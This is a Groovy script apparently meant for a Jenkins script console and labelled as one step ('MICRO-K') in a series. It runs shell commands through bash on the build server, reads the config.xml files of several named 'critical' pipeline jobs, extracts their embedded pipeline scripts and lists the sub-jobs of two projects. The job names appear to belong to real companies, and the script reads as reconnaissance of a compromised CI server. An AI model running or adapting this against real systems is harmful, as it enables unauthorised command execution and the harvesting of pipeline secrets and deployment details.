// MICRO-K: Read Jenkinsfiles from critical nested jobs (caja-api, axii, t1-admin-api)
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(15000)
    out.toString().take(4000)
}

// Read the full pipeline scripts (Jenkinsfile is inside config.xml as CpsFlowDefinition)
["cs_legacy_pipe_build_axii-claroshop",
 "cs_legacy_pipe_build_t1-admin-api",
 "cs_legacy_pipe_build_monedero-api",
 "cs_legacy_pipe_build_selfservice"].each { jobName ->
    println "\n=== PIPELINE: ${jobName} ==="
    def cfg = run("find /var/jenkins_home/jobs -path '*${jobName}/config.xml' -not -path '*/builds/*' 2>/dev/null | head -1 | xargs cat 2>/dev/null")
    // Extract script section
    def scriptMatch = (cfg =~ /<script>(.*?)<\/script>/s)
    if (scriptMatch) {
        println scriptMatch[0][1].take(2000)
    } else {
        // Print last 2000 chars (pipeline is at the end)
        println cfg.length() > 2000 ? "(truncated start)..." + cfg[-2000..-1] : cfg
    }
}

// Also look at sub-jobs of sears-ia-backend and t1comercios
println "\n=== SEARS-IA-BACKEND sub-jobs ==="
def r1 = run('find /var/jenkins_home/jobs/sears-ia-backend -maxdepth 3 -name config.xml -not -path "*/builds/*" 2>/dev/null | head -10')
println r1

println "\n=== T1COMERCIOS sub-jobs ==="
def r2 = run('find /var/jenkins_home/jobs/t1comercios -maxdepth 3 -name config.xml -not -path "*/builds/*" 2>/dev/null | head -20')
println r2

println "\n=== DONE MICRO-K ==="
